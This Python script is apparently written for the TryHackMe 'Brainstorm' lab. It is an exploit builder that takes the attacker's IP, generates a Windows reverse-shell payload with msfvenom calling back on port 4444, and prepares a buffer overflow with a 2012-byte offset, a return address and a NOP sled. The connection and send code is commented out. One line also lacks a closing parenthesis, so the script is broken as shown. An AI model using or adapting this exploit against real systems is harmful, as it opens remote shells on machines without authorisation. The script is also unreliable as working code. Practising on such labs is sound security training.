import netifaces as ni
import socket
import sys
import ipaddress
import re
import time
import subprocess
import fcntl
import struct
import os

os.system('cls' if os.name == 'nt' else 'clear')

# Port Settings
LPORT="4444"                     #Port number for reverse shell listening.
username = b"Brainstorm"

ans = True
while ans:
    print("""
What network is the machine you are exploiting on?\n
[1] Local Network Loopback: "lo"
[2] Ethernet Interface 0:   "eth0"
[3] Try Hack Me Network:    "tun0"
[4] Custom:                 "User Specified IP"
""")
    ans = input("Please enter your option: ")
    if ans == "1":
        ni.ifaddresses('lo')
        LHOST = ni.ifaddresses('lo')[ni.AF_INET][0]['addr']
        print("\nLocal IP Address set as: ", LHOST)
        time.sleep(2)
        break
    elif ans == "2":
        ni.ifaddresses('eth0')
        LHOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
        print("\nLocal IP Address set as: ", LHOST)
        time.sleep(2)
        break
    elif ans == "3":
        ni.ifaddresses('tun0')
        LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
        print("\nLocal IP Address set as: ", LHOST)
        time.sleep(2)
        break
    elif ans == "4":
        while True:
            try:
                LHOST = ipaddress.ip_address(
                    input('\nPlease Enter the Custom IP address of your local mahine on the network: '))
                break
            except ValueError:
                print('\nYou entered an invalid IP Adress, please try again... ')
                time.sleep(2)
        
        print("\nLocal IP Address set as: ", LHOST)
        break
    elif ans != "":
        print("\n****Not Valid Choice, Try again****")
        time.sleep(2)
        print("\nWhat would you like to do?")
        os.system('cls' if os.name == 'nt' else 'clear') 

while True:
    try:
        RHOST = ipaddress.ip_address(input('\nPlease Enter the IP address of the machine you wish to attack: '))
        break
    except ValueError:
        print('You entered an invalid IP Adress, please try again... ')
        time.sleep(2)
        continue

print("\nRemote machine IP Address set as: ", RHOST)
RHOST = bytes(str(RHOST), encoding='utf-8')

print("\nGenerating Exploit code for injection, Please Standby...\n")

# Wait for 2 seconds
time.sleep(2)

#SHELL = os.system("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b \\x00 -f c " .format(LHOST, LPORT) + "| tr -d '\n' | sed 's/\"//g' | sed 's/.\{22\}//' | sed 's/.$//' >exploit.txt ")
#SHELL = subprocess.check_output(("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b \\x00 -f c " .format(LHOST, LPORT) + "| tr -d '\n' | sed 's/\"//g' | sed 's/.\{22\}//' | sed 's/.$//' |sed 's/^/\"/' | sed 's/$/\"/'"), shell=True)
#SHELL = subprocess.check_output(("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b \\x00 -f c " .format(LHOST, LPORT) + "| tr -d '\n' | sed 's/\"//g' | sed 's/.\{22\}//' | sed 's/.$//' "), shell=True)
SHELL = subprocess.check_output(("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b \\x00 -f hex " .format(LHOST, LPORT)
#SHELL = str(SHELL)
#SHELL = SHELL.replace("\\\\","\\")
#SHELL = SHELL[2:-1]
#SHELL = bytes(SHELL, encoding='utf-8')
#SHELL = SHELL.decode('utf8')
#SHELL = str(SHELL)
#SHELL = subprocess.check_output(cmd,shell=True)
#SHELL = bytes(str(SHELL), 'raw_unicode_escape')

#This information is based on the machines service module
#message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 10
#message = str("A" * 2012 + '\\xdf\\x14\\x50\\x62' + '\\x90' * 10)
#payload = message + SHELL
#payload = bytes(payload, encoding='utf-8')

print("\nAttacking machine, please standby for connection and exploit...\n")
time.sleep(2)

#print(payload)
#print(message + SHELL)
#print(SHELL.decode('utf8'))

#try:
    #print("Trying initial coonnection with ",RHOST, "\n")
    #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #s.connect((RHOST, 9999)) 
    #print("CONNECTION SUCCESS!, Sending payload and breaking the program...")
    #s.recv(1024)
    #s.recv(1024)
    #s.send( b"Brainstorm" + b'\r\n')
    #print("Username sent successfully")
    #s.send(payload + b'\r\n')
    #print("Message sent successfully")
    #s.recv(1024)
    #s.close()

#except:
    #print("The server is not available to connect to")
    #sys.exit()